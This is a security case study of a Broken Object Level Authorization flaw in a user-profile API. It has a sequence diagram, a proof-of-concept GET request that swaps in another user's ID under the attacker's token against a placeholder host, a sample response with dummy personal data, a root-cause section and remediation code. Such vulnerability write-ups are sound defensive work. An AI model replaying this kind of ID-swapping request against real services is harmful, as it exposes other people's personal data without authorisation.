# Case Study: Broken Object Level Authorization (BOLA / IDOR) in User Profile API


## Executive Summary
During internal security research, a critical Broken Object Level Authorization (BOLA) vulnerability was identified within an API endpoint responsible for user data retrieval. An unprivileged authenticated user could manipulate object identifiers to access sensitive PII (Personally Identifiable Information) belonging to other accounts.


---


## Vulnerability Details

- **Vulnerability Type:** Broken Object Level Authorization (OWASP API Security Top 10 - API1:2023)
- **Severity:** High
- **Affected Endpoint:** GET /api/v1/users/{userId}/profile
- **Impact:** Unauthorized PII Data Exposure (Email, Phone Number, Full Name, Internal Role)

---


## Technical Analysis & Attack Flow


The application fails to validate whether the userId in the path parameter matches the identity asserted by the caller's JWT token payload.


```mermaid
sequenceDiagram
    autonumber
    actor Attacker as Attacker (User ID: 1002)
    participant API as API Gateway / Backend Service
    participant DB as User Database


    Attacker->>API: GET /api/v1/users/1001/profile<br/>Authorization: Bearer <Attacker_JWT>
    Note over API: Backend validates JWT signature,<br/>but MISSES ownership check!
    API->>API: Extract path parameter (userId = 1001)
    API->>DB: SELECT * FROM users WHERE id = 1001;
    DB-->>API: Return User 1001 Record
    API-->>Attacker: 200 OK (Exposed PII of Victim ID 1001)
```
---


## Proof of Concept (PoC)


### Request:
```http
GET /api/v1/users/1001/profile HTTP/1.1
Host: target-api.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6... (Attacker's Valid Token)
Accept: application/json
```

### Response:
```http
HTTP/1.1 200 OK
Content-Type: application/json


{
  "status": "success",
  "data": {
    "user_id": 1001,
    "full_name": "Victim User",
    "email": "victim@example.com",
    "phone": "+6281234567890",
    "role": "MEMBER"
  }
}
```
---


## Root Cause Analysis
The service relies solely on the HTTP route parameter (/1001/) to query the data repository without checking if the authenticated sub claim inside the validated JWT matches the requested resource owner ID.


---


## Remediation Strategy


1. **Enforce Server-Side Ownership Check:**
   Validate user identity against resource identity at the service level before fetching data.


```java
// Spring Boot Security Context Enforcement Example
String authenticatedUserId = SecurityContextHolder.getContext().getAuthentication().getName();


if (!authenticatedUserId.equals(requestedUserId) && !currentUserHasRole("ADMIN")) {
    throw new AccessDeniedException("Unauthorized resource access attempt.");
}
```

2. **Use Non-Sequential Identifiers:**
   Replace auto-incrementing integer IDs (1001, 1002) with unpredictable Universally Unique Identifiers (UUID v4).